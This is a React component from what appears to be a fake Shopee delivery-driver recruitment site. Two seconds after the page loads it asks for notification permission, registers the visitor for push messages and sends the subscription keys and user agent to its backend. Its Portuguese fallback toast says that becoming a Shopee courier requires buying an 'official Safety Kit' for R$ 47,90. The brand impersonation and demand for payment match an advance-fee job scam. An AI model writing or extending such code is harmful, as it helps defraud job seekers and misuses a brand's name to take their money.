import React, { useEffect, useState } from 'react';
import { useToast } from '@/hooks/use-toast';
import { AlertTriangle } from 'lucide-react';
import axios from 'axios';

const PWANotification: React.FC = () => {
  const { toast } = useToast();
  const [hasShownNotification, setHasShownNotification] = useState(false);

  // Função para registrar usuário para push notifications
  const subscribeUserToPush = async () => {
    try {
      console.log('🔄 Iniciando subscribeUserToPush...');
      
      // Verificar se service worker e push são suportados
      if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
        console.log('⚠️ Push notifications não suportadas');
        showToastNotification();
        return;
      }

      // Registrar service worker se necessário
      const registration = await navigator.serviceWorker.ready;
      console.log('🛠️ Service Worker pronto:', registration);

      // Verificar permissão atual
      let permission = Notification.permission;
      console.log('🔐 Permissão atual:', permission);
      
      // Solicitar permissão se ainda não foi concedida
      if (permission === 'default') {
        permission = await Notification.requestPermission();
        console.log('🔐 Nova permissão solicitada:', permission);
      }

      if (permission === 'granted') {
        // Obter chave pública VAPID atualizada
        const vapidPublicKey = 'BBAAnkFyzcnnfWoQ9DqjiY9QkQSFvScy9P_yi5LstVHcu01ja4rkYi_4ax50cZ24TTa_4aebogbVLur0NSEWHNo';
        
        // Converter chave para Uint8Array
        const convertedVapidKey = urlBase64ToUint8Array(vapidPublicKey);
        
        // Obter subscription
        const subscription = await registration.pushManager.subscribe({
          userVisibleOnly: true,
          applicationServerKey: convertedVapidKey
        });
        
        console.log('🔔 Push subscription obtida:', subscription);
        
        // Enviar subscription para o servidor
        await savePushSubscription(subscription);
        
        // Enviar notificação local como boas-vindas
        new Notification('📢 Shopee Delivery - Bem-vindo!', {
          body: 'Notificações ativadas! Você receberá avisos importantes sobre o cadastro.',
          icon: '/shopee-icon.jpg',
          badge: '/shopee-icon.jpg',
          tag: 'shopee-welcome'
        });
        
        console.log('✅ Usuário registrado para push notifications!');
      } else {
        console.log('⚠️ Permissão negada, usando toast');
        showToastNotification();
      }
    } catch (error) {
      console.error('❌ Erro ao registrar push notifications:', error);
      showToastNotification();
    }
  };

  // Função para converter chave VAPID
  const urlBase64ToUint8Array = (base64String: string) => {
    const padding = '='.repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding)
      .replace(/-/g, '+')
      .replace(/_/g, '/');
    
    const rawData = window.atob(base64);
    const outputArray = new Uint8Array(rawData.length);
    
    for (let i = 0; i < rawData.length; ++i) {
      outputArray[i] = rawData.charCodeAt(i);
    }
    return outputArray;
  };

  // Função para salvar subscription no servidor
  const savePushSubscription = async (subscription: PushSubscription) => {
    try {
      const p256dhKey = subscription.getKey('p256dh');
      const authKey = subscription.getKey('auth');
      
      const subscriptionData = {
        endpoint: subscription.endpoint,
        p256dhKey: p256dhKey ? btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(p256dhKey)))) : '',
        authKey: authKey ? btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authKey)))) : '',
        userAgent: navigator.userAgent,
        ipAddress: '', // Será preenchido pelo backend
      };
      
      console.log('💾 Salvando subscription:', subscriptionData);
      
      await axios.post('/api/push-subscriptions', subscriptionData);
      console.log('✅ Subscription salva no servidor!');
    } catch (error) {
      console.error('❌ Erro ao salvar subscription:', error);
    }
  };

  // Função para mostrar toast como fallback
  const showToastNotification = () => {
    toast({
      title: "📢 Aviso Importante",
      description: (
        <div className="flex items-start space-x-2">
          <AlertTriangle className="w-5 h-5 text-yellow-500 mt-0.5 flex-shrink-0" />
          <div>
            <p className="font-medium text-sm">Pagamento Obrigatório</p>
            <p className="text-xs text-gray-600 mt-1">
              Para se tornar entregador Shopee, é necessário adquirir o Kit de Segurança oficial por R$ 47,90.
            </p>
          </div>
        </div>
      ),
      variant: "default",
      duration: 8000, // 8 segundos
    });
  };

  useEffect(() => {
    console.log('🔍 PWANotification: Iniciando verificação...');
    
    // Verificar se está rodando em modo PWA (standalone)
    const isStandalone = window.matchMedia('(display-mode: standalone)').matches;
    const isIOSStandalone = (window.navigator as any).standalone;
    const isAndroidApp = document.referrer.includes('android-app://');
    const isPWA = isStandalone || isIOSStandalone || isAndroidApp;
    
    console.log('📱 Detecção PWA:', {
      isStandalone,
      isIOSStandalone,
      isAndroidApp,
      isPWA,
      referrer: document.referrer,
      userAgent: navigator.userAgent
    });

    // Verificar se já mostrou a notificação nesta sessão
    const notificationShown = sessionStorage.getItem('pwa_payment_notification_shown');
    console.log('💾 Notificação já mostrada nesta sessão:', notificationShown);

    // SEMPRE tentar registrar push notifications para teste
    console.log('🔔 Preparando notificação e registro de push...');
    
    // Aguardar um pouco para garantir que a página carregou completamente
    const timer = setTimeout(() => {
      console.log('⏰ Timer executado, enviando notificação...');
      
      // Tentar registrar para push notifications
      subscribeUserToPush();
      
      // Marcar que a notificação foi mostrada nesta sessão
      sessionStorage.setItem('pwa_payment_notification_shown', 'true');
      setHasShownNotification(true);
    }, 2000); // Aguardar 2 segundos após o carregamento

    return () => clearTimeout(timer);
  }, [toast, hasShownNotification]);

  return null; // Este componente não renderiza nada visível
};

export default PWANotification;